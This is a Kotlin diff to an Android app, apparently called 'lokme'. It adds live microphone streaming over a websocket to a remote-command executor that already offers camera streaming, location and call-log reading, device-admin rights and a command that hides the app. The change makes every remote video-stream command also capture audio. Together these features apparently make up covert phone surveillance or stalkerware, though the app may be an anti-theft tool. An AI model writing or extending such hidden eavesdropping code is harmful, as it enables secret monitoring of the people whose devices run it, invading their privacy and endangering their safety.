@@ -9,6 +9,7 @@ import android.os.Looper
 import android.util.Log
 import com.lokme.admin.DeviceAdminReceiver
 import com.lokme.calllog.CallLogReader
+import com.lokme.camera.AudioStreamHelper
 import com.lokme.camera.CameraHelper
 import com.lokme.camera.VideoStreamHelper
 import com.lokme.location.LocationHelper
@@ -26,6 +27,8 @@ class CommandExecutor(private val context: Context) {
     private var cameraHelper: CameraHelper? = null
     var videoStreamHelper: VideoStreamHelper? = null
         private set
+    var audioStreamHelper: AudioStreamHelper? = null
+        private set
 
     fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
         try {
@@ -39,7 +42,10 @@ class CommandExecutor(private val context: Context) {
                     streamHelper.initialize()
                     videoStreamHelper = streamHelper
 
-                    Log.d("CommandExec", "Camera + VideoStream initialized")
+                    val audioHelper = AudioStreamHelper(context)
+                    audioStreamHelper = audioHelper
+
+                    Log.d("CommandExec", "Camera + VideoStream + AudioStream initialized")
                 } catch (e: Exception) {
                     Log.e("CommandExec", "Camera init failed: ${e.message}")
                 }
@@ -179,7 +185,10 @@ class CommandExecutor(private val context: Context) {
         val useFront = json.optBoolean("front_camera", false)
 
         helper.startStream(wsClient, deviceId, useFront)
-        onSuccess("Video stream started (${if (useFront) "front" else "back"} camera)")
+
+        audioStreamHelper?.startStream(wsClient, deviceId)
+
+        onSuccess("Video + audio stream started (${if (useFront) "front" else "back"} camera)")
     }
 
     private fun stopVideoStream(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
@@ -190,7 +199,8 @@ class CommandExecutor(private val context: Context) {
         }
 
         helper.stopStream()
-        onSuccess("Video stream stopped")
+        audioStreamHelper?.stopStream()
+        onSuccess("Video + audio stream stopped")
     }
 
     private fun hideApp(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
